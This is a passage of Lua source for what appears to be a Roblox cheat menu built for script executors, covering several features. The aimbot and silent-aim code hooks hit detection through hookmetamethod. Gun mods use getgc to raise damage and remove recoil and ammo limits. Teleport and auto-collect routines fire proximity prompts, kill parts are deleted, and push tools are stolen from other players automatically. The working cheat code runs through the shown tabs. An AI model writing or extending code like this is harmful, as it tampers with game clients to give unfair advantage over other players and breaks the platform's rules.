        UILib.createColorRow("Spectator Color",   cfg.ESPColorSpectator,       function(c) cfg.ESPColorSpectator      = c end)
        UILib.createColorRow("Placed Bear Traps", cfg.ESPColorPlacedBearTrap,  function(c) cfg.ESPColorPlacedBearTrap = c end)

        UILib.sectionLabel("Item ESP Colors")
        UILib.createColorRow("Default Item",  cfg.ESPColorItem,      function(c) cfg.ESPColorItem      = c end)
        UILib.createColorRow("Bandage",       cfg.ESPColorBandage,   function(c) cfg.ESPColorBandage   = c end)
        UILib.createColorRow("Bear Trap",     cfg.ESPColorBearTrap,  function(c) cfg.ESPColorBearTrap  = c end)
        UILib.createColorRow("Bloxy Cola",    cfg.ESPColorBloxyCola, function(c) cfg.ESPColorBloxyCola = c end)
        UILib.createColorRow("Metal Pipe",    cfg.ESPColorMetalPipe, function(c) cfg.ESPColorMetalPipe = c end)
        UILib.createColorRow("Pepper Spray",  cfg.ESPColorPepper,    function(c) cfg.ESPColorPepper    = c end)
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: AIMBOT
    -- ════════════════════════════════════════════════════════════
    local function renderAimbot()
        UILib.clearContent()
        UILib.sectionLabel("Aimbot")
        --ENABLE AIMBOT
        local aimbotToggle = UILib.createToggle("Enable Aimbot", cfg.AimbotEnabled, function(v)
            cfg.AimbotEnabled = v
        end)
        syncFns.AimbotEnabled = aimbotToggle.Sync
        --TEAM CHECK
        UILib.createToggle("Team Check", cfg.AimbotTeamCheck, function(v)
            cfg.AimbotTeamCheck = v
        end, "Skip firing when the target is on your team.")
        --VISIBLE CHECK
        UILib.createToggle("Visible Check", cfg.AimbotVisibleCheck, function(v)
            cfg.AimbotVisibleCheck = v
        end, "Only target players you can see through walls (no obstructions).")
        --SHOW FOV CIRCLE
        UILib.createToggle("Show FOV Circle", cfg.FOVCircleEnabled, function(v)
            cfg.FOVCircleEnabled = v
        end)
        --FOV RADIUS
        UILib.createSlider("FOV Radius", 30, 500, cfg.FOV, 0, function(v)
            cfg.FOV = v
        end)
        --SMOOTHNESS
        UILib.createSlider("Smoothness", 0.01, 1, cfg.Smoothness, 2, function(v)
            cfg.Smoothness = v
        end)
        --FOV CIRCLE COLOR
        UILib.createColorRow("FOV Circle Color", cfg.AimbotColorFOV, function(c) cfg.AimbotColorFOV = c end)
        UILib.mutedText("Lerps camera toward the nearest head within the FOV circle each frame.")

        UILib.sectionLabel("Aim Lock")
        --AIM LOCK
        local aimLockToggle = UILib.createToggle("Aim Lock", cfg.AimLockEnabled, function(v)
            cfg.AimLockEnabled = v
        end)
        syncFns.AimLockEnabled = aimLockToggle.Sync
        UILib.keybindRow("Aim Lock Toggle", "AimLockToggle", function()
            cfg.AimLockEnabled = not cfg.AimLockEnabled
            if syncFns.AimLockEnabled then syncFns.AimLockEnabled(cfg.AimLockEnabled) end
        end)
        UILib.mutedText("Snaps camera to nearest enemy head. Bullets follow camera look direction.")
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: QUESTS
    -- ════════════════════════════════════════════════════════════
    local function buildQuestButtons()
        UILib.clearContent()

        UILib.sectionLabel("Interactions")
        UILib.createToggle("Instant Interact", cfg.InstantPrompt, function(v)
            cfg.InstantPrompt = v
            applyInstantPrompts(v)
        end)
        UILib.mutedText("Auto-fires any ProximityPrompt the moment it appears.")

        UILib.sectionLabel("Do Quest Now")
        do
            local questRow = UILib.rowFrame(40, "DoQuestNow")
            UILib.rowLabel(questRow, "Do Quest Now")
            local qKeyLbl = UILib.keyChip(questRow, keybinds.DoQuest.Name, -220)
            UILib.actionBtn(questRow, "Set Key", 68, UDim2.new(1,-144,0.5,-13), function()
                keyCapture.active = true; keyCapture.keybindKey = "DoQuest"; keyCapture.label = qKeyLbl
                qKeyLbl.Text = "..."
            end)
            UILib.actionBtn(questRow, "Go >", 62, UDim2.new(1,-70,0.5,-13), function()
                task.spawn(function()
                    local assigned = getAssignedQuestName()
                    if not assigned then
                        game:GetService("StarterGui"):SetCore("SendNotification", {
                            Title = "Quest", Text = "No quest label found in PlayerGui.QuestUI.", Duration = 4
                        })
                        return
                    end
                    doQuestNow()
                end)
            end)
        end
        UILib.mutedText("Quest label must be visible in your GUI (PlayerGui.QuestUI) for detection to work.")

        UILib.sectionLabel("Quest Teleporters")
        UILib.createToggle("Avoid Killer Quest Teleport", cfg.SafeQuestEnabled, function(v)
            cfg.SafeQuestEnabled = v
            if v then _sSQ() else _xSQ() end
        end, "Every 2.5s, teleports you to whichever quest objective is furthest from the killer.")
        UILib.mutedText("Teleports to the quest spot furthest from the killer.")

        UILib.sectionLabel("Map Teleports")
        UILib.mutedText("Teleport to quest locations on the current map.")
        do
            local mapTpFolder = _gQF()
            if not mapTpFolder then
                UILib.mutedText("Quest folder not found  -  load into a map first.")
            else
                local spots = {}
                for _, child in ipairs(mapTpFolder:GetChildren()) do
                    local part = child:IsA("BasePart") and child
                        or (child:IsA("Model") and (child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")))
                    if part then table.insert(spots, {name = child.Name, part = part}) end
                end
                table.sort(spots, function(a, b) return a.name < b.name end)
                if #spots == 0 then
                    UILib.mutedText("No teleport spots found in quest folder.")
                else
                    for _, spot in ipairs(spots) do
                        local r = UILib.rowFrame(36, "MapTP_" .. spot.name:gsub("[^%w]","_"))
                        local nameLbl = UILib.rowLabel(r, spot.name)
                        nameLbl.Size = UDim2.new(1, -90, 1, 0)
                        nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
                        local spt = spot
                        UILib.actionBtn(r, ">> TP", 72, UDim2.new(1,-82,0.5,-13), function()
                            local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                            if hrp and spt.part and spt.part.Parent then
                                pcall(function() hrp.CFrame = CFrame.new(spt.part.Position + Vector3.new(0, 4, 0)) end)
                                game:GetService("StarterGui"):SetCore("SendNotification", {
                                    Title = "Map TP", Text = ">> " .. spt.name, Duration = 1
                                })
                            else
                                game:GetService("StarterGui"):SetCore("SendNotification", {
                                    Title = "Map TP", Text = spt.name .. " not found  -  map may have changed.", Duration = 3
                                })
                            end
                        end)
                    end
                    UILib.mutedText(#spots .. " location(s) found. Refresh Quests tab to update.")
                end
            end
        end

        UILib.sectionLabel("Item Teleporters")
        UILib.mutedText("Teleport to any item currently in the map. Click to jump to it.")
        do
            local itemFolder = getItemsFolder()
            if not itemFolder then
                UILib.mutedText("Items folder not found  -  load into a map first.")
            else
                local itemNames = {}
                local seen = {}
                for _, item in ipairs(itemFolder:GetChildren()) do
                    local n = item.Name
                    if not seen[n] then seen[n] = true; table.insert(itemNames, n) end
                end
                table.sort(itemNames)
                if #itemNames == 0 then
                    UILib.mutedText("No items found in the map.")
                else
                    for _, iName in ipairs(itemNames) do
                        local r = UILib.rowFrame(36, "ItemTP_" .. iName:gsub("[^%w]","_"))
                        local nameLbl = UILib.rowLabel(r, iName)
                        nameLbl.Size = UDim2.new(1, -165, 1, 0)
                        nameLbl.TextTruncate = Enum.TextTruncate.AtEnd
                        local capturedName = iName
                        UILib.actionBtn(r, "Teleport", 78, UDim2.new(1,-168,0.5,-13), function()
                            local folder2 = getItemsFolder()
                            if not folder2 then
                                game:GetService("StarterGui"):SetCore("SendNotification", {
                                    Title = "Teleport", Text = capturedName .. "  -  items folder not found.", Duration = 3
                                }); return
                            end
                            local hrp2 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                            if not hrp2 then return end
                            for _, item2 in ipairs(folder2:GetChildren()) do
                                if item2.Name == capturedName then
                                    local part = item2:IsA("BasePart") and item2
                                        or (item2:IsA("Model") and (item2.PrimaryPart or item2:FindFirstChildWhichIsA("BasePart")))
                                    if part then
                                        pcall(function() hrp2.CFrame = CFrame.new(part.Position + Vector3.new(0, 3.5, 0)) end)
                                        game:GetService("StarterGui"):SetCore("SendNotification", {
                                            Title = "Teleport", Text = "-> " .. capturedName, Duration = 1
                                        })
                                    end
                                    return
                                end
                            end
                            game:GetService("StarterGui"):SetCore("SendNotification", {
                                Title = "Teleport", Text = capturedName .. " not found in map.", Duration = 3
                            })
                        end)
                        UILib.actionBtn(r, "Collect All", 80, UDim2.new(1,-90,0.5,-13), function()
                            task.spawn(function()
                                local folder3 = getItemsFolder()
                                if not folder3 then return end
                                local hrp3 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                                if not hrp3 then return end
                                local found3 = {}
                                for _, item3 in ipairs(folder3:GetChildren()) do
                                    if item3.Name == capturedName and item3.Parent then
                                        table.insert(found3, item3)
                                    end
                                end
                                if #found3 == 0 then
                                    game:GetService("StarterGui"):SetCore("SendNotification", {
                                        Title = "Collect", Text = "No " .. capturedName .. " found.", Duration = 3
                                    }); return
                                end
                                local returnCF = hrp3.CFrame
                                local collected = 0
                                for _, item3 in ipairs(found3) do
                                    if not item3 or not item3.Parent then continue end
                                    local part = item3:IsA("BasePart") and item3
                                        or (item3:IsA("Model") and (item3.PrimaryPart or item3:FindFirstChildWhichIsA("BasePart")))
                                    if not part then continue end
                                    -- Bob's sense check: skip invisible items (already picked up / held)
                                    if part.Transparency >= 1 then continue end
                                    if part then
                                        pcall(function() hrp3.CFrame = CFrame.new(part.Position + Vector3.new(0, 3, 0)) end)
                                        task.wait(0.25)
                                        for _, pp in ipairs(item3:GetDescendants()) do
                                            if pp:IsA("ProximityPrompt") then
                                                pcall(function() fireproximityprompt(pp) end)
                                            end
                                        end
                                        collected = collected + 1
                                    end
                                end
                                pcall(function() hrp3.CFrame = returnCF end)
                                game:GetService("StarterGui"):SetCore("SendNotification", {
                                    Title = "Collect", Text = "Visited " .. collected .. "x " .. capturedName, Duration = 3
                                })
                            end)
                        end)
                    end
                    UILib.mutedText(#itemNames .. " item type(s) found. Refresh tab to update list.")
                end
            end
        end
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: MISC
    -- ════════════════════════════════════════════════════════════
    local function renderMisc()
        UILib.clearContent()

        -- ── CMDS panel launcher ──────────────────────────────────────────────
        do
            local cmdRow = UILib.rowFrame(36, "CMDSRow")
            UILib.rowLabel(cmdRow, "Chat Commands")
            UILib.actionBtn(cmdRow, "⌨  CMDS", 80, UDim2.new(1, -88, 0.5, -13), function()
                openCMDSPanel()
            end)
        end

        UILib.sectionLabel("Spawn Utilities")
        UILib.mutedText("For spawn phase only  -  Killparts are usually removed when round starts.")
        do
            local killRow    = UILib.rowFrame(40, "RemoveKillparts")
            UILib.rowLabel(killRow, "Remove Killparts")
            local autoKPConn    = nil
            local autoKPActive  = false

            local function stopAutoKillparts()
                autoKPActive = false
                if autoKPConn then autoKPConn:Disconnect(); autoKPConn = nil end
            end
            local function nukeKillparts(folder)
                for _, c in ipairs(folder:GetDescendants()) do
                    if c:IsA("Script") or c:IsA("LocalScript") then
                        pcall(function() c.Disabled = true end)
                        pcall(function() c:Destroy() end)
                    elseif c:IsA("BasePart") then
                        pcall(function()
                            c.CanCollide  = false; c.CanTouch = false
                            c.Transparency = 1; c.CFrame = CFrame.new(0, -9999, 0)
                        end)
                    end
                end
                pcall(function() folder:Destroy() end)
            end
            local function isKillName(name)
                local n = name:lower()
                return n == "killparts" or n == "kill parts" or n == "killbricks"
                    or n == "killpart"  or n == "killbrick"  or n == "deathzone"
                    or n == "oobkill"   or n == "outofbounds"
            end
            local function deepSearchAndNuke(root, depth)
                if not root or depth > 8 then return end
                for _, child in ipairs(root:GetChildren()) do
                    if isKillName(child.Name) then nukeKillparts(child)
                    else deepSearchAndNuke(child, depth + 1) end
                end
            end
            local function removeAllKillparts()
                for _, child in ipairs(workspace:GetChildren()) do
                    if isKillName(child.Name) then nukeKillparts(child) end
                end
                local gmap = _gGM()
                if gmap then deepSearchAndNuke(gmap, 0) end
                local mapFolder = workspace:FindFirstChild("Map")
                if mapFolder then deepSearchAndNuke(mapFolder, 0) end
            end
            local function startAutoKillparts()
                stopAutoKillparts()
                autoKPActive = true
                removeAllKillparts()
                autoKPConn = workspace.ChildAdded:Connect(function(desc)
                    if not autoKPActive then return end
                    if isKillName(desc.Name) then
                        task.wait(0.05); nukeKillparts(desc)
                    elseif desc:IsA("Model") then
                        task.wait(1.5)
                        if autoKPActive then deepSearchAndNuke(desc, 0) end
                    end
                end)
            end

            local autoBtn = UILib.actionBtn(killRow, "Auto OFF", 80, UDim2.new(1, -148, 0.5, -13), function() end)
            autoBtn.MouseButton1Click:Connect(function()
                if autoKPActive then
                    stopAutoKillparts()
                    autoBtn.Text = "Auto OFF"; autoBtn.BackgroundColor3 = cfg.BG3
                else
                    startAutoKillparts()
                    autoBtn.Text = "Auto ON";  autoBtn.BackgroundColor3 = Color3.fromRGB(0, 140, 60)
                end
            end)
            UILib.actionBtn(killRow, "Once", 52, UDim2.new(1, -60, 0.5, -13), function()
                removeAllKillparts()
            end)
        end

        UILib.sectionLabel("Auto Collect All Items")
        do
            -- Keybind row (default C)
            local collectKbRow = UILib.keybindRow("Collect Toggle", "AutoCollectToggle", function()
                if itemCollectRunning then
                    itemCollectRunning = false
                else
                    task.spawn(function() _rIC(nil) end)
                end
            end)

            local r = UILib.rowFrame(40, "AutoCollectItems")
            UILib.rowLabel(r, "Auto Collect All Items")
            local collectStatusLbl
            local statusRow = UILib.rowFrame(28, "AutoCollectStatus")
            collectStatusLbl = UILib.newLabel(statusRow, "Press Start to begin.", Enum.Font.Gotham, 11, cfg.Muted)
            collectStatusLbl.Size           = UDim2.new(1, -10, 1, 0)
            collectStatusLbl.Position       = UDim2.fromOffset(6, 0)
            collectStatusLbl.TextXAlignment = Enum.TextXAlignment.Left
            local startBtn = UILib.actionBtn(r, "Start", 68, UDim2.new(1, -80, 0.5, -13), function()
                if itemCollectRunning then
                    itemCollectRunning = false
                    collectStatusLbl.Text = "Cancelled."
                else
                    task.spawn(function() _rIC(collectStatusLbl) end)
                end
            end)
            RunService.Heartbeat:Connect(function()
                if startBtn and startBtn.Parent then
                    startBtn.Text = itemCollectRunning and "Stop" or "Start"
                end
            end)
            -- keybindRow above already registers the keybind — no duplicate needed
        end

        UILib.sectionLabel("Auto Steal Push Tool")
        UILib.createToggle("Steal Push Tools", cfg.AutoStealEnabled, function(v)
            cfg.AutoStealEnabled = v
            if v then _sAS() else _xAS() end
        end, "Watches nearby players for push tools (Super Push/Push). Steals the best one found automatically. Prioritizes Super Push > Push.")

        UILib.sectionLabel("Auto Equip Vest")
        UILib.createToggle("Auto Equip Vest", cfg.AutoVestEnabled, function(v)
            cfg.AutoVestEnabled = v
            if v then startAutoVest() else stopAutoVest() end
        end, "Automatically equips Tactical Vest immediately when picked up.")

        -- ── Auto Redeem Codes ────────────────────────────────────────────
        UILib.sectionLabel("Auto Redeem Codes")
        UILib.mutedText("Codes: 10mil  ·  ghost  ·  12kmembers  ·  100kfavorites")
        do
            local redRow = UILib.rowFrame(40, "RedeemCodes")
            UILib.rowLabel(redRow, "Redeem All Codes")
            local redStatusLbl = UILib.newLabel(redRow, "", Enum.Font.Gotham, 11, Color3.fromRGB(100, 220, 100))
            redStatusLbl.Size           = UDim2.new(0, 110, 1, 0)
            redStatusLbl.Position       = UDim2.new(1, -184, 0, 0)
            redStatusLbl.TextXAlignment = Enum.TextXAlignment.Right
            UILib.actionBtn(redRow, "Redeem!", 66, UDim2.new(1, -70, 0.5, -13), function()
                redStatusLbl.Text       = "Sending..."
                redStatusLbl.TextColor3 = cfg.Muted
                task.spawn(function() redeemAllCodes(redStatusLbl) end)
            end)
        end

        -- ── Use Emote ─────────────────────────────────────────────────────
        UILib.sectionLabel("Use Emote")
        UILib.mutedText("Scans game for emotes. Use Prev/Next to cycle, then press Use.")
        do
            local emoteList    = scanEmotes()
            local emoteIndex   = math.clamp(_emoteIdxCache, 1, math.max(1, #emoteList))
            local emoteNameLbl = nil
            local filteredList = {}
            local filterQuery  = ""

            local function applyFilter()
                filteredList = {}
                local q = filterQuery:lower()
                for _, name in ipairs(emoteList) do
                    if q == "" or name:lower():find(q, 1, true) then
                        table.insert(filteredList, name)
                    end
                end
                if #filteredList == 0 then filteredList = { "—" } end
                emoteIndex = 1
                _emoteIdxCache = 1
            end
            applyFilter()

            local function updateEmoteLbl()
                if emoteNameLbl then
                    emoteNameLbl.Text = filteredList[emoteIndex] or "—"
                end
                _emoteIdxCache = emoteIndex
            end

            -- Search row
            local searchRow = UILib.rowFrame(32, "EmoteSearch")
            UILib.rowLabel(searchRow, "[S]").TextColor3 = cfg.Accent
            local searchBox = Instance.new("TextBox", searchRow)
            searchBox.Name                   = "EmoteSearchInput"
            searchBox.Size                   = UDim2.new(1, -110, 1, 0)
            searchBox.Position               = UDim2.fromOffset(70, 0)
            searchBox.BackgroundTransparency = 1
            searchBox.Text                   = ""
            searchBox.PlaceholderText        = "Search emotes..."
            searchBox.Font                   = Enum.Font.Gotham
            searchBox.TextSize               = 12
            searchBox.TextColor3             = cfg.Text
            searchBox.PlaceholderColor3      = cfg.Muted
            searchBox.BorderSizePixel        = 0
            searchBox.ClearTextOnFocus       = false
            searchBox.TextXAlignment         = Enum.TextXAlignment.Center
            searchBox.TextYAlignment         = Enum.TextYAlignment.Center
            searchBox:GetPropertyChangedSignal("Text"):Connect(function()
                filterQuery = searchBox.Text
                applyFilter()
                updateEmoteLbl()
            end)

            local selRow = UILib.rowFrame(40, "EmoteSelector")
            local prevBtn = UILib.actionBtn(selRow, "◀", 32, UDim2.new(0, 100, 0.5, -13), function()
                if filteredList[1] == "—" then return end
                emoteIndex = emoteIndex - 1
                if emoteIndex < 1 then emoteIndex = #filteredList end
                updateEmoteLbl()
            end)
            emoteNameLbl = UILib.newLabel(selRow, filteredList[emoteIndex] or "—", Enum.Font.GothamSemibold, 12, cfg.Text)
            emoteNameLbl.Size           = UDim2.new(0, 130, 1, 0)
            emoteNameLbl.Position       = UDim2.fromOffset(136, 0)
            emoteNameLbl.TextXAlignment = Enum.TextXAlignment.Center
            emoteNameLbl.TextTruncate   = Enum.TextTruncate.AtEnd
            local nextBtn = UILib.actionBtn(selRow, "▶", 32, UDim2.new(0, 270, 0.5, -13), function()
                if filteredList[1] == "—" then return end
                emoteIndex = emoteIndex + 1
                if emoteIndex > #filteredList then emoteIndex = 1 end
                updateEmoteLbl()
            end)

            local useRow = UILib.rowFrame(40, "UseEmote")
            UILib.rowLabel(useRow, #emoteList .. " emote(s) found")
            -- ▶ Use
            UILib.actionBtn(useRow, "▶ Use", 50, UDim2.new(1, -232, 0.5, -13), function()
                local name = filteredList[emoteIndex]
                if not name or name == "—" then return end
                _emotePaused = false
                fireEmote(name)
            end)
            -- ⏸ Pause / ▶ Resume
            local pauseBtn
            pauseBtn = UILib.actionBtn(useRow, "⏸ Pause", 52, UDim2.new(1, -176, 0.5, -13), function()
                if not _activeEmoteTrack then return end
                _emotePaused = not _emotePaused
                pcall(function()
                    _activeEmoteTrack:AdjustSpeed(_emotePaused and 0 or _emoteSpeed)
                end)
                if pauseBtn then
                    pauseBtn.Text = _emotePaused and "▶ Resume" or "⏸ Pause"
                end
            end)
            -- ■ Stop
            UILib.actionBtn(useRow, "■ Stop", 54, UDim2.new(1, -118, 0.5, -13), function()
                if _activeEmoteTrack then
                    pcall(function() _activeEmoteTrack:Stop() end)
                    _activeEmoteTrack = nil
                end
                _emotePaused = false
                if pauseBtn then pauseBtn.Text = "⏸ Pause" end
            end)
            UILib.actionBtn(useRow, "Rescan", 56, UDim2.new(1, -58, 0.5, -13), function()
                _scannedEmotes = nil
                emoteList  = scanEmotes()
                filterQuery = searchBox.Text
                applyFilter()
                updateEmoteLbl()
                UILib.notify("Emotes", "Found " .. #emoteList .. " emote(s).", 3)
            end)
            -- Speed slider
            UILib.createSlider("Emote Speed", 0.1, 5.0, 1.0, 1, function(v)
                _emoteSpeed = v
                if _activeEmoteTrack and not _emotePaused then
                    pcall(function() _activeEmoteTrack:AdjustSpeed(v) end)
                end
            end)
        end
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: GUNS
    -- ════════════════════════════════════════════════════════════
    local function renderGunMods()
        UILib.clearContent()

        UILib.sectionLabel("Gun Mods")
        UILib.createToggle("Modify Gun", cfg.GunModEnabled, function(v)
            cfg.GunModEnabled = v
            if v then _sgM() else _xgM() end
        end, "Boosts damage, removes recoil/spread and maxes fire rate.")
        UILib.mutedText("Requires getgc support. Won't work on all executors.")

        UILib.sectionLabel("Auto Reload")
        UILib.createToggle("Auto Reload", cfg.AutoReloadEnabled, function(v)
            cfg.AutoReloadEnabled = v
            if v then startAutoReload() else stopAutoReload() end
        end, "Refills the in-memory ammo counter to max via getgc() — only triggers when bullets actually hit 0, so the gun fires and shows effects normally until empty, then instantly reloads.")

        UILib.sectionLabel("Silent Aim")
        UILib.createToggle("Silent Aim", cfg.SilentAimEnabled, function(v)
            cfg.SilentAimEnabled = v
        end, "Redirects shots at the closest player in your FOV using hookmetamethod.")

        UILib.createToggle("Team Check", cfg.SA_TeamCheck, function(v)
            cfg.SA_TeamCheck = v
        end, "Skip players on your own team.")
        UILib.createToggle("Visible Check", cfg.SA_VisibleCheck, function(v)
            cfg.SA_VisibleCheck = v
        end, "Only target players you can see through walls (no obstructions).")

        -- Target Part cycle row
        do
            local SA_PARTS = {"HumanoidRootPart", "Head", "Random"}
            local function saPartIdx()
                for i, v in ipairs(SA_PARTS) do if v == cfg.SA_TargetPart then return i end end
                return 1
            end
            local partRow  = UILib.rowFrame(40, "SA_TargetPart")
            UILib.rowLabel(partRow, "Target Part")
            local partLbl  = UILib.newLabel(partRow, cfg.SA_TargetPart, Enum.Font.GothamSemibold, 11, cfg.Accent)
            partLbl.Size         = UDim2.new(0.45, 0, 1, 0)
            partLbl.Position     = UDim2.fromOffset(100, 0)
            partLbl.TextXAlignment = Enum.TextXAlignment.Left
            UILib.actionBtn(partRow, "◀", 24, UDim2.new(1, -60, 0.5, -13), function()
                local i = saPartIdx() - 1
                if i < 1 then i = #SA_PARTS end
                cfg.SA_TargetPart = SA_PARTS[i]
                partLbl.Text = cfg.SA_TargetPart
            end)
            UILib.actionBtn(partRow, "▶", 24, UDim2.new(1, -30, 0.5, -13), function()
                local i = saPartIdx() + 1
                if i > #SA_PARTS then i = 1 end
                cfg.SA_TargetPart = SA_PARTS[i]
                partLbl.Text = cfg.SA_TargetPart
            end)
        end

        -- Silent Aim Method cycle row
        do
            local SA_METHODS = {"Raycast", "FindPartOnRay", "FindPartOnRayWithWhitelist", "FindPartOnRayWithIgnoreList", "Mouse.Hit/Target"}
            local SA_LABELS  = {"Raycast", "FindPartOnRay", "FPORWithWhitelist", "FPORWithIgnoreList", "Mouse.Hit/Target"}
            local function saMethodIdx()
                for i, v in ipairs(SA_METHODS) do if v == cfg.SA_Method then return i end end
                return 1
            end
            local methodRow = UILib.rowFrame(40, "SA_Method")
            UILib.rowLabel(methodRow, "SA Method")
            local methodLbl = UILib.newLabel(methodRow, SA_LABELS[saMethodIdx()], Enum.Font.GothamSemibold, 10, cfg.Accent)
            methodLbl.Size         = UDim2.new(0.52, 0, 1, 0)
            methodLbl.Position     = UDim2.fromOffset(100, 0)
            methodLbl.TextXAlignment = Enum.TextXAlignment.Left
            UILib.actionBtn(methodRow, "◀", 24, UDim2.new(1, -60, 0.5, -13), function()
                local i = saMethodIdx() - 1
                if i < 1 then i = #SA_METHODS end
                cfg.SA_Method = SA_METHODS[i]
                methodLbl.Text = SA_LABELS[i]
            end)
            UILib.actionBtn(methodRow, "▶", 24, UDim2.new(1, -30, 0.5, -13), function()
                local i = saMethodIdx() + 1
                if i > #SA_METHODS then i = 1 end
                cfg.SA_Method = SA_METHODS[i]
                methodLbl.Text = SA_LABELS[i]
            end)
        end

        UILib.createSlider("Hit Chance (%)", 0, 100, cfg.SA_HitChance, 0, function(v)
            cfg.SA_HitChance = v
        end)

        UILib.sectionLabel("Silent Aim — Prediction")
        UILib.createToggle("Mouse.Hit/Target Prediction", cfg.SA_Prediction, function(v)
            cfg.SA_Prediction = v
        end, "Leads shots by adding target velocity × prediction amount to Mouse.Hit. Only active when method is Mouse.Hit/Target.")
        UILib.createSlider("Prediction Amount", 0.165, 1.0, cfg.SA_PredictionAmount, 3, function(v)
            cfg.SA_PredictionAmount = v
        end)

        UILib.sectionLabel("Silent Aim — Visuals")
        UILib.createToggle("Show FOV Circle", cfg.SA_ShowFOV, function(v)
            cfg.SA_ShowFOV = v
        end, "Draws a circle around your mouse showing the silent aim detection radius.")
        UILib.createSlider("FOV Radius", 10, 360, cfg.SA_FOVRadius, 0, function(v)
            cfg.SA_FOVRadius = v
        end)
        UILib.createColorRow("FOV Circle Color", cfg.SA_FOVColor, function(c)
            cfg.SA_FOVColor = c
        end)
        UILib.createToggle("Show Silent Aim Target", cfg.SA_ShowTarget, function(v)
            cfg.SA_ShowTarget = v
        end, "Draws a small dot on screen where silent aim is currently locking onto.")
    end

    -- ════════════════════════════════════════════════════════════
    -- TAB: VIEWER
    -- ════════════════════════════════════════════════════════════
    local function renderViewer()
        UILib.clearContent()
        if viewerConnection then viewerConnection:Disconnect(); viewerConnection = nil end
        local searchQuery = ""

        -- searchRow/searchBox/countLbl live outside buildList so the periodic
        -- refresh never destroys them — destroying a focused TextBox drops focus
        local searchRow = UILib.rowFrame(36, "ViewerSearch")
        UILib.rowLabel(searchRow, "[S]").TextColor3 = cfg.Accent
        local searchBox = Instance.new("TextBox", searchRow)
        searchBox.Name              = "SearchInput"
        searchBox.Size              = UDim2.new(0.7, 0, 1, 0)
        searchBox.Position          = UDim2.fromOffset(102, 0)
        searchBox.BackgroundTransparency = 1
        searchBox.Text              = ""
        searchBox.PlaceholderText   = "Search username or display name..."
        searchBox.Font              = Enum.Font.Gotham
        searchBox.TextSize          = 12
        searchBox.TextColor3        = cfg.Text
        searchBox.PlaceholderColor3 = cfg.Muted
        searchBox.BorderSizePixel   = 0
        searchBox.ClearTextOnFocus  = true

        local countLbl = Instance.new("TextLabel", content)
        countLbl.Name                 = "CountLabel"
        countLbl.Size                 = UDim2.new(1, 0, 0, 20)
        countLbl.BackgroundTransparency = 1
        countLbl.Font                 = Enum.Font.GothamSemibold
        countLbl.TextSize             = 11
        countLbl.TextColor3           = cfg.Muted
        countLbl.TextXAlignment       = Enum.TextXAlignment.Center
        countLbl.BorderSizePixel      = 0

        local function buildList()
            -- Selective destroy: never touch searchRow or countLbl
            for _, c in ipairs(content:GetChildren()) do
                if c ~= searchRow and c ~= countLbl
                and not c:IsA("UIListLayout") and not c:IsA("UIPadding") then
                    c:Destroy()
                end
            end

            local function sortedPlayers()
                local list = Players:GetPlayers()
                local function teamPriority(p)
                    if not p.Team then return 4 end
                    local t = p.Team.Name:lower()
                    if t == "killers"     or t == "killer"     then return 1 end
                    if t == "juggernauts"  or t == "juggernaut" then return 1 end
                    if t == "survivors"   or t == "survivor"   then return 2 end
                    if t == "spectators"  or t == "spectator"  then return 5 end
                    return 3
                end
                table.sort(list, function(a, b)
                    local pa, pb = teamPriority(a), teamPriority(b)
                    if pa ~= pb then return pa < pb end
                    return a.Name < b.Name
                end)
                return list
            end

            local shown = 0
            for _, plr in ipairs(sortedPlayers()) do
                if searchQuery ~= "" then
                    local uname = plr.Name:lower(); local dname = plr.DisplayName:lower()
                    if not uname:find(searchQuery,1,true) and not dname:find(searchQuery,1,true) then continue end
                end
                shown = shown + 1

                local hum        = plr.Character and plr.Character:FindFirstChildOfClass("Humanoid")
                local hp         = hum and hum.Health or 0
                local maxHp      = hum and (hum.MaxHealth > 0 and hum.MaxHealth or 100) or 100
                local pct        = hp / maxHp
                local teamCol    = getPlayerESPColor(plr)
                local isKillerP  = isPlayerOnKillerTeam(plr)
                local gun        = getPlayerGun(plr)
                local pushItemName, _ = getPlayerPushItem(plr)
                local ROW_H      = 64

                local row = Instance.new("Frame", content)
                row.Name            = "Player_" .. plr.Name
                row.BorderSizePixel = 0
                row.Size            = UDim2.new(1, 0, 0, ROW_H)
                UILib.addCorner(row, 8)

                -- Row background tinted by team
                if isKillerP then
                    row.BackgroundColor3 = Color3.fromRGB(50, 18, 18)
                    UILib.addStroke(row, 1.5, Color3.fromRGB(200, 50, 50), 0.2)
                else
                    local rowBG = isKillerP
                        and Color3.new(
                            math.clamp(teamCol.R*0.25+cfg.BG2.R*0.15,0,1),
                            math.clamp(teamCol.G*0.05+cfg.BG2.G*0.05,0,1),
                            math.clamp(teamCol.B*0.05+cfg.BG2.B*0.05,0,1))
                        or Color3.new(
                            math.clamp(teamCol.R*0.08+cfg.BG2.R*0.92,0,1),
                            math.clamp(teamCol.G*0.08+cfg.BG2.G*0.92,0,1),
                            math.clamp(teamCol.B*0.08+cfg.BG2.B*0.92,0,1))
                    row.BackgroundColor3 = rowBG
                    local rowStroke = Instance.new("UIStroke", row)
                    rowStroke.Thickness    = isKillerP and 1.5 or 1
                    rowStroke.Color        = teamCol
                    rowStroke.Transparency = isKillerP and 0.2 or 0.55
                end

                local strip = Instance.new("Frame", row)
                strip.Name             = "TeamStrip"
                strip.Size             = UDim2.new(0, 4, 1, -10)
                strip.Position         = UDim2.fromOffset(4, 5)
                strip.BackgroundColor3 = teamCol
                strip.BorderSizePixel  = 0
                UILib.addCorner(strip, 2)

                local avatarFrame = Instance.new("Frame", row)
                avatarFrame.Name             = "AvatarFrame"
                avatarFrame.Size             = UDim2.fromOffset(44, 44)
                avatarFrame.Position         = UDim2.fromOffset(12, 10)
                avatarFrame.BackgroundColor3 = cfg.BG3
                avatarFrame.BorderSizePixel  = 0
                UILib.addCorner(avatarFrame, 6)
                local avatarImg = Instance.new("ImageLabel", avatarFrame)
                avatarImg.Name              = "Avatar"
                avatarImg.Size              = UDim2.new(1, 0, 1, 0)
                avatarImg.BackgroundTransparency = 1
                avatarImg.Image             = ""
                avatarImg.ScaleType         = Enum.ScaleType.Crop
